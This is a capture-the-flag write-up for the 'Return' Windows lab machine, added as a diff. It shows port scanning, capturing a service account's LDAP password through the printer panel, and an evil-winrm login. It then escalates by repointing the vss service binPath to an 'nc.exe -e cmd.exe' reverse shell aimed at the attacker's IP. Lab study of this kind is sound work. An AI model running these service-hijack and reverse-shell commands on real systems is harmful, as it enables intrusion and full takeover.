@@ -1,0 +1,122 @@
+# Return Write-Up
+
+Easy
+
+Tags:
+`enum4linux`
+`Win Remote`
+`Service Control`
+
+## Intro
+
+1. Use `configuration pages` of the priter to specific the
+domain controller or file server.
+
+2. 
+
+## Enumeration
+
+### Port scanning
+
+```
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.108 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sV -sC 10.10.11.108
+```
+
+```
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: HTB Printer Admin Panel
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-11 03:03:46Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49682/tcp open  msrpc         Microsoft Windows RPC
+49694/tcp open  msrpc         Microsoft Windows RPC
+53118/tcp open  msrpc         Microsoft Windows RPC
+```
+
+### Try [SMB Enumeration](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)
+
+Nothing to exploit
+
+### Web interface
+
+Edit `Server Address` -> attacker ip
+
+netcat listener on port 389
+
+password: `1edFg43012!!`
+
+WinRM tool kali - `evil-winrm`
+
+```
+ruby evil-winrm.rb -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
+```
+
+## Privilege Escalation
+
+Check `Local Group Memberships` of `svc-printer` user
+
+```
+net user svc-printer
+```
+
+```
+Local Group Memberships      *Print Operators      *Remote Management Use
+                             *Server Operators
+Global Group memberships     *Domain Users
+```
+
+[Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group can start, stop system services
+
+Use [basic command](https://github.com/Hackplayers/evil-winrm#basic-commands) of `evil-winrm` to upload `windows-binaries` - A collection of Windows executables for use on penetration tests.
+
+```
+upload /usr/share/windows-resources/binaries/nc.exe
+```
+
+Use `sc.exe config` - Modifies the value of a service's entries in the registry and in the Service Control Manager database.
+
+```
+sc config <service name> binPath= <binary path>
+```
+
+Why use `vss - Volume Shadow Copy` instead of another service?
+
+How to use `nc.exe`? Why use `"nc.exe -e cmd.exe <ip> <port>"` command?
+
+```
+sc.exe config vss binpath='C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.16.6 1234'
+```
+
+listener on port 1234
+
+```
+sc.exe start vss
+```
